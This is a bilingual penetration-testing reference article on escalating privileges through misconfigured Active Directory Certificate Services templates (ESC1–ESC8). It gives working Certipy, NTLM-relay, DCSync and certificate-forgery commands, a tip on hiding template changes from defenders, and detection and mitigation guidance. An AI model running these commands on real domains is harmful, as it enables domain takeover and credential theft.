---
id: adcs-certificate-abuse
title_en: ADCS Certificate Abuse (ESC1-ESC8)
title_zh: ADCS 证书滥用（ESC1–ESC8）
summary_en: Active Directory Certificate Services becomes a privilege escalation path the moment one template lets a low-privileged user request a certificate on behalf of somebody else. ESC1 through ESC8 cover nearly every real-world case, and a single certificate is enough to become a domain admin.
summary_zh: 只要有一个模板允许低权用户替别人申请证书，AD CS 就成了一条提权通道。ESC1 到 ESC8 基本覆盖了实战中的全部情况，而一张证书就足以拿到域管。
tags: [active-directory, adcs, pki, certificates, privilege-escalation, windows]
tools: [Certipy, Rubeus, ntlmrelayx, PKINITtools, BloodHound]
attck: [T1649]
platform: [windows]
difficulty: advanced
updated: 2026-10-08
---

<!-- lang:en -->
### Why certificates are the quiet way in

Active Directory Certificate Services (AD CS) is a CA bolted onto a domain. It authenticates users with **certificates** instead of passwords, and Kerberos accepts a certificate in place of a password through PKINIT. That produces a very clean escalation: if you can obtain a certificate that says you are `Administrator`, you do not need their password, their hash, or their session — you simply log in as them.

The whole attack surface comes down to one question per certificate template: **who can enrol, and what does the template let them put in the request?** A template that allows a low-privileged user to supply a Subject Alternative Name (SAN) plus client authentication is a domain admin button.

This is common because certificate templates are configured once and then forgotten, and because the defaults are permissive in ways that are not obvious from the GUI.

### Step 1 — Enumerate

Certipy does the heavy lifting:

```bash
# find every template the current user can enrol in, and flag the dangerous ones
certipy find -u jdoe@corp.local -p 'Summer2026!' -dc-ip 10.10.10.10 -vulnerable -enabled

# full output, including ACLs, to a file for offline reading
certipy find -u jdoe@corp.local -p 'Summer2026!' -dc-ip 10.10.10.10 -stdout -json templates.json
```

Also worth running when you have a foothold:

```powershell
# CA configuration, including the dangerous EDITF flag that ESC6 abuses
certutil -config "CA01.corp.local\CORP-CA01-CA" -getreg policy\EditFlags
```

BloodHound shows the same thing as graph edges, which is useful for spotting the shortest path rather than the flashiest template.

### ESC1 — the one that ends the engagement

Conditions: the template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, allows client authentication (`1.3.6.1.5.5.7.3.2`), and your user has enrolment rights.

```bash
# ask for a certificate as the domain administrator, using our own credentials
certipy req -u jdoe@corp.local -p 'Summer2026!' -ca CORP-CA01-CA -template User \
  -upn administrator@corp.local -dc-ip 10.10.10.10

# the resulting .pfx is now an administrator credential
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

`certipy auth` prints the NT hash, which you can pass around, or gives you a TGT with `-dc-ip` reachable and Kerberos working.

Two practical notes. First, if the template requires approval, `certipy req` will say so and you need another ESC. Second, always try `-upn administrator@corp.local` even when the template looks uninteresting: templates are frequently clones of one another and inherited the flag without anyone noticing.

### ESC2 and ESC3 — the variants people forget

**ESC2** is any-purpose or no-EKU templates. A certificate with the "Any Purpose" EKU can be used for client authentication, so the same escalation applies without a client-auth EKU on the template.

**ESC3** is enrolment agent templates. If a template grants Certificate Request Agent, you can request a certificate *on behalf of* another user in two steps:

```bash
# 1. get an enrolment agent certificate for our own user
certipy req -u jdoe@corp.local -p 'Summer2026!' -ca CORP-CA01-CA -template EnrollmentAgent

# 2. use it to request a certificate as the administrator
certipy req -u jdoe@corp.local -p 'Summer2026!' -ca CORP-CA01-CA -template User \
  -on-behalf-of 'CORP\administrator' -pfx jdoe.pfx
```

### ESC4 — rewrite a template instead of finding one

If you have write access over a template object (often through an ACL granted to a group that was never cleaned up), you do not need the template to be broken: you make it broken, exploit it, and put it back.

```bash
certipy template -u jdoe@corp.local -p 'Summer2026!' -template VulnTemplate -save-old
# ... exploit as ESC1 ...
certipy template -u jdoe@corp.local -p 'Summer2026!' -template VulnTemplate -restore
```

Restoring afterwards matters. If the blue team finds the template altered *and* your certificate already issued, the investigation is trivial.

### ESC5 / ESC6 / ESC7 — the CA itself

**ESC5** is write access over PKI-related objects (the CA's container, the NTAuthCertificates object, certificate templates container). That is enough to install a rogue template or a rogue CA certificate.

**ESC6** is the CA-wide flag `EDITF_ATTRIBUTESUBJECTALTNAME2`. With it set, *any* template that permits client authentication will accept a SAN you supply — so a template that looks safe is effectively ESC1:

```bash
certipy req -u jdoe@corp.local -p 'Summer2026!' -ca CORP-CA01-CA -template User \
  -upn administrator@corp.local -dc-ip 10.10.10.10
```

**ESC7** is CA officer rights (`ManageCA` / `ManageCertificates`). With `ManageCA` you can approve your own pending request, or enable the ESC6 flag yourself; with `ManageCertificates` you can issue a previously denied request.

### ESC8 — relay to the web enrolment endpoint

The AD CS HTTP enrolment endpoint (`/certsrv/`) accepts NTLM authentication and, by default, does not enforce Extended Protection for Authentication. That makes it a relay target:

```bash
# relay coerced machine authentication to the CA's web enrolment
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
```

Coerce a domain controller (PetitPotam, PrinterBug) and you get a certificate for the DC's machine account. Then:

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
# with a DC certificate you can DCSync immediately
impacket-secretsdump -k -no-pass corp.local/DC01\$@dc01.corp.local
```

This chain — coerce, relay, DCSync — is the single most reliable path to domain admin in a default Windows environment with AD CS installed.

### Using the certificate

Everything converges on the same step:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

The output gives you the account's NT hash (pass-the-hash everywhere), and with `-dc-ip` plus working Kerberos you can also get a TGT. From there it is ordinary AD tradecraft: secretsdump, PsExec, or requesting a certificate for the next account.

### Persistence: the golden certificate

If you can read the CA's private key (local admin on the CA, or a backup), you can forge certificates offline forever:

```bash
certipy ca -backup -ca CORP-CA01-CA -u administrator@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10
certipy forge -ca-pfx CORP-CA01-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'
```

A golden certificate survives password resets and does not touch the CA again, which is exactly why it is worth flagging to the client as a critical finding even when the engagement ends there.

### Detection

- **Event 4886 / 4887** on the CA: certificate issued / denied. A certificate issued to a SAN that does not match the requester's account is the key signal.
- **Event 4768/4769 with certificate-based logon**, especially for a privileged account from a host that account never uses.
- Template changes: **Event 4899** (certificate services template updated). ESC4 in action.
- `certipy`, `Certify.exe` and `Rubeus.exe` are caught by name and behaviour; the web enrolment POST body is also distinctive (`CertAttrib=CertificateTemplate`).
- Requests with the requester's account in one field and a different identity in the SAN are almost never legitimate outside of an enrolment agent workflow.

### Mitigation

- Audit every template: turn off `Enrollee Supplies Subject` unless a specific workflow needs it, and require CA manager approval for templates that do keep it.
- Remove client-authentication EKU from templates that do not need it, and remove "Any Purpose" / no-EKU templates entirely.
- Clear the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.
- Review ACLs on templates and PKI containers; enrolment rights should be a small, named group, and old groups must be removed.
- Enable **Extended Protection for Authentication** (EPA) and require HTTPS on the web enrolment endpoints; better, disable web enrolment if nothing uses it.
- Enable **LDAP signing and channel binding** so relay into LDAP is not an alternative.
- Treat CA servers as Tier 0: they should be reachable by almost nothing, and their private keys should be backed up under HSM or an equivalent.
- Monitor: alert on any certificate issued where SAN ≠ requester, and on template modification.

<!-- lang:zh -->
### 为什么证书是最安静的一条路

AD CS（Active Directory 证书服务）就是绑在域上的一套 CA。它用**证书**而不是口令来认证用户，而 Kerberos 通过 PKINIT 接受证书代替口令。这带来一条非常干净的提权路径：只要你能拿到一张写着你是 `Administrator` 的证书，你既不需要他的口令、也不需要哈希、也不需要他的会话 —— 直接以他的身份登录。

整个攻击面归结到每个证书模板上的一个问题：**谁能注册，以及模板允许他在申请里填什么？** 一个允许低权用户自带 SAN（Subject Alternative Name）并且允许客户端认证的模板，就是一颗域管按钮。

这种情况很常见，因为模板通常配置一次就被遗忘，而且默认值在 GUI 上看不出问题的宽松之处。

### 第一步 —— 枚举

用 Certipy 一把梭：

```bash
# 找出当前用户能注册的所有模板，并标记危险的
certipy find -u jdoe@corp.local -p 'Summer2026!' -dc-ip 10.10.10.10 -vulnerable -enabled

# 完整输出（含 ACL）落文件，方便离线慢慢读
certipy find -u jdoe@corp.local -p 'Summer2026!' -dc-ip 10.10.10.10 -stdout -json templates.json
```

已经拿到落脚点时也可以顺手看：

```powershell
# CA 配置，包含 ESC6 利用的那个危险 EDITF 标志
certutil -config "CA01.corp.local\CORP-CA01-CA" -getreg policy\EditFlags
```

BloodHound 会把同样的信息画成图上的边，用来找"最短路径"比找"最花哨的模板"更实用。

### ESC1 —— 一个就够收工

条件：模板带 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`、允许客户端认证（`1.3.6.1.5.5.7.3.2`）、你的用户有注册权限。

```bash
# 用我们自己的凭据，申请一张写着域管的证书
certipy req -u jdoe@corp.local -p 'Summer2026!' -ca CORP-CA01-CA -template User \
  -upn administrator@corp.local -dc-ip 10.10.10.10

# 得到的 .pfx 现在就是域管凭据
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

`certipy auth` 会打印 NT 哈希（可以拿去 pass-the-hash），Kerberos 通的情况下还会直接给你 TGT。

两个实战提醒。第一，如果模板要求审批，`certipy req` 会告诉你，那就得换另一个 ESC。第二，哪怕模板看起来平平无奇，也一定要试一次 `-upn administrator@corp.local`：模板经常是互相克隆出来的，那个危险标志跟着被继承下来而没人注意。

### ESC2 与 ESC3 —— 容易被忽略的变体

**ESC2** 是「Any Purpose」或没有 EKU 的模板。带 Any Purpose EKU 的证书可以用于客户端认证，所以不需要模板本身配客户端认证 EKU，提权照样成立。

**ESC3** 是注册代理模板。如果某个模板授予 Certificate Request Agent 权限，你就可以分两步**替别人**申请证书：

```bash
# 1. 先给自己拿一张注册代理证书
certipy req -u jdoe@corp.local -p 'Summer2026!' -ca CORP-CA01-CA -template EnrollmentAgent

# 2. 用它以域管身份申请证书
certipy req -u jdoe@corp.local -p 'Summer2026!' -ca CORP-CA01-CA -template User \
  -on-behalf-of 'CORP\administrator' -pfx jdoe.pfx
```

### ESC4 —— 不找坏模板，自己把它改坏

如果你对模板对象有写权限（通常来自某个早该清理却没清理的组的 ACL），你不需要模板本身有问题：把它改成有问题的，利用完再改回去。

```bash
certipy template -u jdoe@corp.local -p 'Summer2026!' -template VulnTemplate -save-old
# ... 按 ESC1 打 ...
certipy template -u jdoe@corp.local -p 'Summer2026!' -template VulnTemplate -restore
```

事后恢复很重要。如果蓝队发现模板被改过、而且你的证书还已经签发，溯源调查会变得极其简单。

### ESC5 / ESC6 / ESC7 —— 直接拿 CA

**ESC5** 是对 PKI 相关对象的写权限（CA 的容器、NTAuthCertificates 对象、证书模板容器）。有这些就足以塞进一个恶意模板或一张伪造的 CA 证书。

**ESC6** 是 CA 级别的开关 `EDITF_ATTRIBUTESUBJECTALTNAME2`。一旦开启，**任何**允许客户端认证的模板都会接受你自带的 SAN —— 于是看起来安全的模板实际上等价于 ESC1：

```bash
certipy req -u jdoe@corp.local -p 'Summer2026!' -ca CORP-CA01-CA -template User \
  -upn administrator@corp.local -dc-ip 10.10.10.10
```

**ESC7** 是 CA 管理权限（`ManageCA` / `ManageCertificates`）。有 `ManageCA` 就能批准自己提交的待审请求，甚至自己把 ESC6 那个标志打开；有 `ManageCertificates` 就能把之前被拒绝的请求签出来。

### ESC8 —— 中继打 Web 注册端点

AD CS 的 HTTP 注册端点（`/certsrv/`）接受 NTLM 认证，而且默认**不启用**扩展保护（EPA）。这就让它成了中继目标：

```bash
# 把强制来的机器认证中继到 CA 的 Web 注册
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
```

用 PetitPotam 或 PrinterBug 强制一台域控来认证，你就能拿到这台 DC 机器账户的证书。然后：

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
# 拿到 DC 证书后可以直接 DCSync
impacket-secretsdump -k -no-pass corp.local/DC01\$@dc01.corp.local
```

这条链 —— 强制认证、中继、DCSync —— 是在装了 AD CS 的默认 Windows 环境里通往域管最可靠的一条路。

### 用证书

所有路径最终都收敛到同一步：

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

输出会给你该账户的 NT 哈希（到处都能 pass-the-hash）；`-dc-ip` 加 Kerberos 可用时还能拿到 TGT。之后就回到常规 AD 打法：secretsdump、PsExec，或者接着给下一个账户签证书。

### 持久化：黄金证书

如果你能读到 CA 的私钥（在 CA 上是本地管理员，或者拿到备份），就能离线永久伪造证书：

```bash
certipy ca -backup -ca CORP-CA01-CA -u administrator@corp.local -p 'Passw0rd!' -dc-ip 10.10.10.10
certipy forge -ca-pfx CORP-CA01-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'
```

黄金证书不受改口令影响，也不会再碰 CA 一次。所以哪怕项目到此为止，这一条也值得作为严重发现单独写给客户。

### 检测

- CA 上的 **4886 / 4887** 事件：证书签发 / 拒绝。**SAN 与申请者账户不一致**的签发是最关键的信号。
- **4768/4769 出现基于证书的登录**，尤其是特权账户来自它从不使用的主机。
- 模板被修改：**4899** 事件（证书服务模板更新）—— 这就是 ESC4 的动作。
- `certipy`、`Certify.exe`、`Rubeus.exe` 会被按名字和行为抓；Web 注册的 POST 体也很有特征（`CertAttrib=CertificateTemplate`）。
- 申请者字段是一个身份、SAN 又是另一个身份的请求，除了注册代理流程之外几乎不可能是正常的。

### 缓解

- 逐个审计模板：除非确有工作流需要，关掉 `Enrollee Supplies Subject`；确实要保留的，必须开启 CA 管理员审批。
- 不需要客户端认证的模板，去掉客户端认证 EKU；「Any Purpose」和没有 EKU 的模板直接删掉。
- 清掉 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志。
- 复查模板与 PKI 容器的 ACL；注册权限应该只属于一个命名清晰的小组，历史遗留组必须移除。
- 在 Web 注册端点上启用 **EPA**（扩展保护）并强制 HTTPS；如果没人用，干脆关掉 Web 注册。
- 开启 **LDAP 签名与通道绑定**，否则中继进 LDAP 仍然是一条替代路径。
- 把 CA 服务器当作 Tier 0：几乎不该有任何东西能访问它，私钥要用 HSM 或同等手段保护。
- 监控：对「SAN ≠ 申请者」的签发告警，对模板修改告警。
